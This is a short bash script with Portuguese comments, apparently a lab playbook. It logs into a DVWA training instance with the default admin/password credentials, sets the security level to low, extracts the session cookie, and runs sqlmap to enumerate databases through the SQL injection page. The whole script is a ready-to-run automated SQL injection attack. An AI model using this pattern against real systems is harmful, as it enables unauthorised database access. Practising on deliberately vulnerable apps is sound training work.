#!/bin/bash

# Play 03 — SQLMap DVWA em produção
# Autentica no DVWA e roda sqlmap corretamente, usando --cookie em vez de --cookie-file

# Define host DVWA (sem porta)
TARGET_HOST="${DVWA_HOST:-web-dvwa-production.up.railway.app}"

echo "[*] Autenticando no DVWA em http://$TARGET_HOST/login.php..."
# Diretório do script
SCRIPT_PATH="$(readlink -f "${BASH_SOURCE[0]}")"
SCRIPT_DIR="$(dirname "$SCRIPT_PATH")"
COOKIE_FILE="$SCRIPT_DIR/cookies.txt"

# 1. Login e captura de cookies
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET_HOST/login.php" > /dev/null

echo "[*] Definindo segurança para LOW..."
curl -s -b "$COOKIE_FILE" "http://$TARGET_HOST/security.php?security=low" > /dev/null

# 2. Extrai valor do PHPSESSID do cookie file
PHPSESSID=$(grep -i "PHPSESSID" "$COOKIE_FILE" | awk '{print $7}')
# Monta string de cookie para sqlmap
COOKIE="security=low; PHPSESSID=$PHPSESSID"

# 3. Executa SQLMap com --cookie
INJECTION_URL="http://$TARGET_HOST/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
echo "[*] Iniciando análise SQL Injection com sqlmap contra $INJECTION_URL..."
sqlmap \
  -u "$INJECTION_URL" \
  --cookie "$COOKIE" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs

echo "[✓] Análise SQLi concluída."
